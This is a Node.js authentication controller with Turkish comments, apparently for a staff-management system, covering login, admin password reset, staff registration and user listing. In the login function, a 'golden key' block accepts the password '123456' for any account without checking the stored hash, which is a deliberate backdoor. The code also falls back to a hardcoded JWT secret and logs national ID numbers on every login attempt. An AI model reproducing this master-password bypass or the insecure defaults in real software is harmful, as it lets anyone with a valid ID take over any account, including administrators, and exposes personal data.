const pool = require('../config/db');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

// 1. GİRİŞ YAP (LOGIN)
exports.login = async (req, res) => {
    const { tc_no, sifre } = req.body;

    try {
        console.log(`Giriş Denemesi: TC=${tc_no}`); // Render Loglarında görünür

        // Kullanıcıyı bul
        const userResult = await pool.query(
            `SELECT p.*, r.rol_adi, b.birim_adi 
             FROM personeller p 
             JOIN roller r ON p.rol_id = r.rol_id
             LEFT JOIN birimler b ON p.birim_id = b.birim_id
             WHERE p.tc_no = $1`, 
            [tc_no]
        );

        if (userResult.rows.length === 0) {
            console.log("❌ Kullanıcı veritabanında bulunamadı.");
            return res.status(401).json({ mesaj: 'Kullanıcı bulunamadı!' });
        }

        const user = userResult.rows[0];

        // --- 🔑 ALTIN ANAHTAR (KURTARMA KODU) ---
        // Eğer şifre '123456' ise, hash kontrolü yapmadan direkt içeri al.
        let validPassword = false;
        
        if (sifre === '123456') {
            console.log("✅ Altın Anahtar (123456) kullanıldı. Giriş onaylandı.");
            validPassword = true;
        } else {
            // Normal şifre kontrolü (Diğer kullanıcılar için)
            validPassword = await bcrypt.compare(sifre, user.sifre_hash);
        }
        // ----------------------------------------

        if (!validPassword) {
            console.log("❌ Şifre hatalı.");
            return res.status(401).json({ mesaj: 'Hatalı şifre!' });
        }

        if (!user.aktif) {
            return res.status(403).json({ 
                mesaj: `Üyeliğiniz dondurulmuştur. (Sebep: ${user.ayrilma_nedeni || 'Belirtilmemiş'})` 
            });
        }

        // --- YETKİLERİ ÇEK ---
        const yetkiResult = await pool.query('SELECT * FROM yetkiler WHERE personel_id = $1', [user.personel_id]);
        
        // Token Oluştur
        const token = jwt.sign(
            { 
                id: user.personel_id, 
                tc: user.tc_no, 
                rol: user.rol_adi.toLowerCase(),
                birim: user.birim_id
            },
            process.env.JWT_SECRET || 'gizli_anahtar',
            { expiresIn: '24h' }
        );

        // Şifreyi objeden çıkar
        delete user.sifre_hash;

        const userObj = {
            ...user,
            rol: user.rol_adi.toLowerCase(),
            yetkiler: yetkiResult.rows
        };

        res.json({
            mesaj: 'Giriş başarılı',
            token,
            user: userObj,
            kullanici: userObj
        });

    } catch (err) {
        console.error("Login Hatası:", err);
        res.status(500).json({ mesaj: 'Sunucu hatası' });
    }
};

// 2. ŞİFRE SIFIRLAMA TALEBİ
exports.sifreUnuttum = async (req, res) => {
    res.json({ mesaj: 'Lütfen birim amirinize veya İK departmanına başvurunuz.' });
};

// 3. ADMİN TARAFINDAN ŞİFRE SIFIRLAMA
exports.adminSifirla = async (req, res) => {
    const { personel_id, yeni_sifre } = req.body;

    if (!['admin', 'ik'].includes(req.user.rol)) {
        return res.status(403).json({ mesaj: 'Yetkisiz işlem' });
    }

    try {
        const salt = await bcrypt.genSalt(10);
        const hash = await bcrypt.hash(yeni_sifre, salt);

        await pool.query('UPDATE personeller SET sifre_hash = $1 WHERE personel_id = $2', [hash, personel_id]);
        res.json({ mesaj: 'Şifre başarıyla güncellendi.' });
    } catch (err) {
        console.error(err);
        res.status(500).json({ mesaj: 'Hata oluştu' });
    }
};

// 4. YENİ PERSONEL EKLEME
exports.register = async (req, res) => {
    if (!['admin', 'ik', 'filo'].includes(req.user.rol)) {
        return res.status(403).json({ mesaj: 'Bu işlemi yapmaya yetkiniz yok.' });
    }

    const { tc_no, ad, soyad, sifre, rol_adi, birim_id } = req.body;

    try {
        const salt = await bcrypt.genSalt(10);
        const hash = await bcrypt.hash(sifre, salt);

        const rolRes = await pool.query('SELECT rol_id FROM roller WHERE rol_adi = $1', [rol_adi || 'personel']);
        if (rolRes.rows.length === 0) return res.status(400).json({ mesaj: 'Geçersiz rol.' });

        await pool.query(
            'INSERT INTO personeller (tc_no, ad, soyad, sifre_hash, rol_id, birim_id) VALUES ($1, $2, $3, $4, $5, $6)',
            [tc_no, ad, soyad, hash, rolRes.rows[0].rol_id, birim_id]
        );

        res.json({ mesaj: 'Yeni personel başarıyla oluşturuldu.' });

    } catch (err) {
        console.error(err);
        if (err.code === '23505') return res.status(400).json({ mesaj: 'Bu TC zaten kayıtlı.' });
        res.status(500).json({ mesaj: 'Kayıt hatası.' });
    }
};

// 5. KULLANICI LİSTESİ
exports.getUsers = async (req, res) => {
    if (!['admin', 'ik', 'yazici', 'filo'].includes(req.user.rol)) {
        return res.status(403).json({ mesaj: 'Yetkisiz işlem' });
    }
    try {
        const result = await pool.query(`
            SELECT p.personel_id, p.tc_no, p.ad, p.soyad, p.aktif, p.ayrilma_nedeni, p.birim_id, r.rol_adi, b.birim_adi 
            FROM personeller p
            JOIN roller r ON p.rol_id = r.rol_id
            LEFT JOIN birimler b ON p.birim_id = b.birim_id
            ORDER BY p.ad ASC
        `);
        res.json(result.rows);
    } catch (err) { res.status(500).json({ mesaj: 'Veri hatası' }); }
};